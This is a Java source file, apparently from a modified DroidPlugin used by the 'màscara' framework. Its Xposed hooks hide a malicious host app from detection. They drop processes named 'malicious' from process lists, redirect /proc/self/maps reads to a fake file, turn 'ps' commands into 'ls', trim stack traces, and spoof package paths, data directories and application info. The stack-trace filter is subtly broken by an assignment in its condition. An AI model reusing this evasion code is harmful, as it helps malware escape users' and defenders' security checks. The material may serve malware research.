/*
**        DroidPlugin Project
**
** Copyright(c) 2015 Andy Zhang <zhangyong232@gmail.com>
**
** This file is part of DroidPlugin.
**
** DroidPlugin is free software: you can redistribute it and/or
** modify it under the terms of the GNU Lesser General Public
** License as published by the Free Software Foundation, either
** version 3 of the License, or (at your option) any later version.
**
** DroidPlugin is distributed in the hope that it will be useful,
** but WITHOUT ANY WARRANTY; without even the implied warranty of
** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
** Lesser General Public License for more details.
**
** You should have received a copy of the GNU Lesser General Public
** License along with DroidPlugin.  If not, see <http://www.gnu.org/licenses/lgpl.txt>
**
**/

package com.morgoo.droidplugin;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.app.Application;
import android.bluetooth.BluetoothAdapter.LeScanCallback;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothGatt;
import android.bluetooth.BluetoothGattCallback;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.res.Configuration;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PersistableBundle;
import android.telephony.TelephonyManager;
import android.content.ContextWrapper;


import java.io.File;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Iterator;
import java.io.IOException;
import java.lang.Exception;
import java.lang.InterruptedException;
import java.lang.Thread;
import java.util.ArrayList;

import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedHelpers;
import de.robv.android.xposed.XposedBridge;



/**
 * Created by Andy Zhang(zhangyong232@gmail.com) 2014/12/5.
 */
public class PluginApplication extends Application {

    private static final String TAG = PluginApplication.class.getSimpleName();
	private static Context context;


    @Override
    public void onCreate() {

		hookGetRunningTasks(getClassLoader());
		hookGetApplicationInfo(getClassLoader());
		hookGetRunningProcesses(getClassLoader());
		hookGetRunningServices(getClassLoader());
		hookGetStackTrace(getClassLoader());
        hookPackageCodePathWrapper(getClassLoader());
		hookPackageCodePathImpl(getClassLoader());
        hookRuntimeExec(getClassLoader());
        hookProc(getClassLoader());
		hookGetDataDirImpl(getClassLoader());
		hookGetDataDirWrapper(getClassLoader());
    
        super.onCreate();
        System.out.println(Build.VERSION.SDK_INT);
		
		context = getBaseContext();
		
        PluginHelper.getInstance().applicationOnCreate(context);
		
		
		
//        try {
//            //Class clazz = Class.forName("android.bluetooth.BluetoothAdapter$LeScanCallback");
//            Class clazz = Class.forName("android.bluetooth.BluetoothDevice");
//            for (Method method : clazz.getDeclaredMethods()) {
//
//                if(method.getName().equals("connectGatt")){
//                    System.out.println(method.getName());
//                    for (Class c: method.getParameterTypes()) {
//                        System.out.println(c.getName());
//                    }
//                }
//            }
//            Class[] cArg = new Class[4];
//            cArg[0] = android.content.Context.class;
//            cArg[1] = boolean.class;
//            cArg[2] = android.bluetooth.BluetoothGattCallback.class;
//            cArg[3] = int.class;
//            Method m = clazz.getMethod("connectGatt", cArg);
//            System.out.println(m.getName());
//        } catch (Exception e) {
//            System.out.println("not existing method");
//        }
    }
	
	



    @Override
    protected void attachBaseContext(Context base) {
        PluginHelper.getInstance().applicationAttachBaseContext(base);
//        HookManager.getDefault().applyHooks(PluginApplication.class);
        super.attachBaseContext(base);
    }
//
//    @Hook("android.telephony.TelephonyManager::getDeviceId")
//    public static String TelephonyManager_getDeviceId(TelephonyManager p1) {
//        System.out.println("Hooked TelephonyManager getDeviceId: " + p1.getDeviceId());
//        return HookManager.getDefault().callSuper(p1);
//    }


    //=====================================================================================================================
//    @Hook("android.app.Activity::startActivity@android.content.Intent")
//    public static void Activity_startActivity(Activity p1, Intent p2) {
//        System.out.println("Hooked startActivity Intent starting: " + p2.getComponent().getClassName());
//        HookManager.getDefault().callSuper(p1, p2);
//    }
//
//    //=====================================================================================================================
//    @Hook("android.bluetooth.BluetoothAdapter::startLeScan@android.bluetooth.BluetoothAdapter$LeScanCallback")
//    public static void BluetoothDevice_connectGatt(android.bluetooth.BluetoothAdapter p1) {
//        System.out.println("Hooked startLeScan");
//        HookManager.getDefault().callSuper(p1);
//    }

    //=====================================================================================================================
//    @Hook("android.bluetooth.BluetoothDevice::connectGatt@android.content.Context#boolean#android.bluetooth.BluetoothGattCallback")
//    public static BluetoothGatt BluetoothDevice_connectGatt(BluetoothDevice p1, Context p2, boolean p3, BluetoothGattCallback p4) {
//        System.out.println("Hooked connectGatt");
//        return HookManager.getDefault().callSuper(p1, p2, p3, p4);
//    }

//    //=====================================================================================================================
//    @Hook("android.bluetooth.BluetoothAdapter$LeScanCallback::onLeScan@android.bluetooth.BluetoothDevice#int#[B")
//    public static void LeScanCallback_onLeScan(LeScanCallback p0, BluetoothDevice p1, int p2, Object p3) {
//        System.out.println("Hooked onLeScan");
//        HookManager.getDefault().callSuper(p0, p1, p2, p3);
//    }



    private void hookRuntimeExec(ClassLoader classLoader) {
        XposedHelpers.findAndHookMethod(Runtime.class, "exec", String.class,
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param){
                        android.util.Log.e("wind", "wind -- beforeHookedMethod exec! para = " + param.args[0]);
						if(((String)param.args[0]).contains("ps"))
							param.args[0] = "ls";
                    }

                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        android.util.Log.e("wind", "wind -- afterHookedMethod exec! para = " + param.args[0]);
                    }
                });
    }


    private void hookProc(ClassLoader classLoader) {
        XposedHelpers.findAndHookConstructor(File.class,String.class,
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param){
                        android.util.Log.e("wind", "wind -- beforeHookedMethod File constructor!  para = " + param.args[0]);
                        if(param.args[0].equals("/proc/self/maps")){
							File fakefile = new File("/data/data/it.unipd/fake.txt"); // it.unipd depends by malicious package name chosen during màscara compilation
							if (!fakefile.exists()) {
									try {
										fakefile.createNewFile();
									} catch (IOException e) {
										e.printStackTrace();
									}
							}
							
							param.args[0] = "/data/data/it.unipd/fake.txt";// it.unipd depends by malicious package name chosen during màscara compilation
						}
						
						
                            
                    }

                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        android.util.Log.e("wind", "wind -- afterHookedMethod File constructor!  para = " + param.args[0]);
                    }
                });
    }

    private void hookPackageCodePathImpl(ClassLoader classLoader) {
				
		XposedHelpers.findAndHookMethod("android.app.ContextImpl", classLoader,"getPackageCodePath",
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param){
                        android.util.Log.e("wind", "wind -- beforeHookedMethod getPackageCodePath! ");

                    }

                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        android.util.Log.e("wind", "wind -- afterHookedMethod getPackageCodePath! " );
						String result = (String)param.getResult();
                        String packageName = result.split("/")[6];
						String news;
						if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) 
							news = "/data/app/" + packageName + "-cMgO1KBIrXvLiB4ticuvqw==/" + "base.apk";
						else
                            news = "/data/app/" + packageName + "-1/" + "base.apk";
						param.setResult(news);
						
                    }
                });
    }
	
	
	private void hookPackageCodePathWrapper(ClassLoader classLoader) {
				
		XposedHelpers.findAndHookMethod(ContextWrapper.class,"getPackageCodePath",
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param){
                        android.util.Log.e("wind", "wind -- beforeHookedMethod getPackageCodePath! ");

                    }

                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        android.util.Log.e("wind", "wind -- afterHookedMethod getPackageCodePath! " );
						String result = (String)param.getResult();
                        String packageName = result.split("/")[6];
						String news;
						if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) 
							news = "/data/app/" + packageName + "-cMgO1KBIrXvLiB4ticuvqw==/" + "base.apk";
						else
                            news = "/data/app/" + packageName + "-1/" + "base.apk";
						param.setResult(news);
						
                    }
                });
    }
	
	
	

	private void hookGetStackTrace(ClassLoader classLoader) {
        XposedHelpers.findAndHookMethod(Throwable.class,"getStackTrace",
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param){
                        android.util.Log.e("wind", "wind -- beforeHookedMethod getStackTrace! ");

                    }

                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        android.util.Log.e("wind", "wind -- afterHookedMethod getStackTrace! " );
                        boolean found = false;
						
						ArrayList<StackTraceElement> newStackTrace = new ArrayList<StackTraceElement>();
						
						for(StackTraceElement stackTraceElement : (StackTraceElement[])param.getResult() ) {
							
							
							
							if(found = false)
								newStackTrace.add(stackTraceElement);
							
							if( (stackTraceElement.getClassName()).equals("android.app.Instrumentation")  &&
									((stackTraceElement.getMethodName()).contains("callApplicationOnCreate") || (stackTraceElement.getMethodName()).contains("callActivityOnCreate") ) )
									found = true;
							
							if( (stackTraceElement.getClassName()).equals("android.app.ActivityThread") ){
									newStackTrace.add(stackTraceElement);
									found = false;
							}
							
							
						}
						
						param.setResult(newStackTrace.toArray(new StackTraceElement[0]));
						
                    }
                });
    }
	
	
	
	private void hookGetRunningProcesses(ClassLoader classLoader) {
        XposedHelpers.findAndHookMethod(ActivityManager.class,"getRunningAppProcesses",
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param){
                        android.util.Log.e("wind", "wind -- beforeHookedMethod getRunningServices! ");

                    }

                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        android.util.Log.e("wind", "wind -- afterHookedMethod getRunningServices! " );
						
						List<ActivityManager.RunningAppProcessInfo> newProcessInfoList = new ArrayList<ActivityManager.RunningAppProcessInfo>();
						
						String pkgName = getApplicationContext().getPackageName();
						
						for(ActivityManager.RunningAppProcessInfo processInfo : ((ArrayList<ActivityManager.RunningAppProcessInfo>)param.getResult())) {
							
							if(processInfo.processName!=null && !processInfo.processName.contains("malicious")){
								newProcessInfoList.add(processInfo);
							}
						}
						
						param.setResult(newProcessInfoList);
					   
                    }
                });
    }
	
	
	private void hookGetApplicationInfo(ClassLoader classLoader) {
        XposedHelpers.findAndHookMethod("android.app.ApplicationPackageManager",classLoader,"getApplicationInfo", String.class,int.class,
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param){
                        android.util.Log.e("wind", "wind -- beforeHookedMethod getApplicationInfo! ");
						if(!((String)param.args[0]).contains("!FAKE!") && !((String)param.args[0]).equals("android") 
							&& !((String)param.args[0]).equals("com.google.android")){
							
							ApplicationInfo ai = new ApplicationInfo();
							
							ai.dataDir = "/data/user/0/" + ((String)param.args[0]);
							ai.processName = ((String)param.args[0]);
							ai.packageName = ((String)param.args[0]);
							
							if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O){
								ai.sourceDir = "/data/app/" + ((String)param.args[0]) + "-5mps8oM_GCN6hi8AAgoplQ==/base.apk";
								ai.publicSourceDir = "/data/app/" + ((String)param.args[0]) + "-5mps8oM_GCN6hi8AAgoplQ==/base.apk";
								ai.nativeLibraryDir = "/data/app/" + ((String)param.args[0]) + "-5mps8oM_GCN6hi8AAgoplQ==/lib/arm64";
							}else{
								ai.sourceDir = "/data/app/" + ((String)param.args[0]) + "-1/base.apk";
								ai.publicSourceDir = "/data/app/" + ((String)param.args[0]) + "-1/base.apk";
								ai.nativeLibraryDir = "/data/app/" + ((String)param.args[0]) + "-1/lib/arm64";
							}
							param.setResult(ai);

						}else if (((String)param.args[0]).contains("!FAKE!")){
							
							param.args[0] = ((String) param.args[0]).replace("!FAKE!","");
						}
                    }

                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        android.util.Log.e("wind", "wind -- afterHookedMethod getApplicationInfo! " );
						
						
						
                    }
                });
    }
	
	
	private void hookGetRunningTasks(ClassLoader classLoader) {
        XposedHelpers.findAndHookMethod(ActivityManager.class,"getRunningTasks", int.class,
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param){
                        android.util.Log.e("wind", "wind -- beforeHookedMethod getRunningTasks! ");

                    }

                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        android.util.Log.e("wind", "wind -- afterHookedMethod getRunningTasks! " );
						
						List<ActivityManager.RunningTaskInfo> newTaskInfoList = new ArrayList<ActivityManager.RunningTaskInfo>();
						
						for(ActivityManager.RunningTaskInfo taskInfo : ((ArrayList<ActivityManager.RunningTaskInfo>)param.getResult())) {
							
							String realPackageName = "";
							
							if(taskInfo.baseActivity.toShortString().contains("it.unipd")){   // it.unipd depends by malicious package name chosen during màscara compilation
								
								realPackageName = taskInfo.baseActivity.getClassName();
									
								while(!isPackageExisted(realPackageName) && realPackageName.contains("."))
									realPackageName = realPackageName.substring(0,realPackageName.lastIndexOf("."));
									
								taskInfo.baseActivity = new ComponentName(realPackageName,taskInfo.baseActivity.getClassName());
								
							}
							
							newTaskInfoList.add(taskInfo);
						}
						
						param.setResult(newTaskInfoList);
					   
                    }
                });
    }

	
	
	private void hookGetRunningServices(ClassLoader classLoader) {
        XposedHelpers.findAndHookMethod(ActivityManager.class,"getRunningServices", int.class,
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param){
                        android.util.Log.e("wind", "wind -- beforeHookedMethod getRunningServices! ");

                    }

                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        android.util.Log.e("wind", "wind -- afterHookedMethod getRunningServices! " );
						
						List<ActivityManager.RunningServiceInfo> newServiceInfoList = new ArrayList<ActivityManager.RunningServiceInfo>();
						
						for(ActivityManager.RunningServiceInfo serviceInfo : ((ArrayList<ActivityManager.RunningServiceInfo>)param.getResult())) {
							
							if(serviceInfo.service!=null && !serviceInfo.service.toString().contains("droidplugin")) {
								
								String realPackageName = "";
									
								if(serviceInfo.service.toString().contains("it.unipd")) {   // it.unipd depends by malicious package name chosen during màscara compilation
									
									realPackageName = serviceInfo.service.getClassName();
									
									while(!isPackageExisted(realPackageName) && realPackageName.contains("."))
										realPackageName = realPackageName.substring(0,realPackageName.lastIndexOf("."));
									
									serviceInfo.service = new ComponentName(realPackageName,serviceInfo.service.getClassName());
								}
								
								newServiceInfoList.add(serviceInfo);
							
							}
						}
						
						param.setResult(newServiceInfoList);
					   
                    }
                });
    }
	
	
	
	
	public boolean isPackageExisted(String targetPackage){
        List<ApplicationInfo> packages;
        PackageManager pm;
		try{
			pm = getPackageManager();       
			packages = pm.getInstalledApplications(0);
			for (ApplicationInfo packageInfo : packages) {
				if(packageInfo.packageName.equals(targetPackage)) return true;
			}        
		}catch(Exception e){
			android.util.Log.e("wind", "wind -- isPackageExisted! " );
		}
        return false;
    }
	
    private void hookGetDataDirImpl(ClassLoader classLoader) {
				
		XposedHelpers.findAndHookMethod("android.app.ContextImpl", classLoader,"getDataDir",
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param){
                        android.util.Log.e("wind", "wind -- beforeHookedMethod getDataDir! ");

                    }

                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        android.util.Log.e("wind", "wind -- afterHookedMethod getDataDir! " );
						
						String path = ((File) param.getResult()).getPath();
						
						String[] res = path.split("/");
						String pkgName = res[res.length-1];
						
						param.setResult(new File("/data/user/0/" + pkgName));
						
                    }
                });
    }
	
	
	private void hookGetDataDirWrapper(ClassLoader classLoader) {
				
		XposedHelpers.findAndHookMethod(ContextWrapper.class,"getDataDir",
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param){
                        android.util.Log.e("wind", "wind -- beforeHookedMethod getDataDir! ");

                    }

                    @Override
                    protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                        android.util.Log.e("wind", "wind -- afterHookedMethod getDataDir! " );
				
						String[] res = ((String) param.getResult()).split("/");
						String pkgName = res[res.length-1];
						
						param.setResult(new File("/data/user/0/" + pkgName));
						
                    }
                });
    }

}



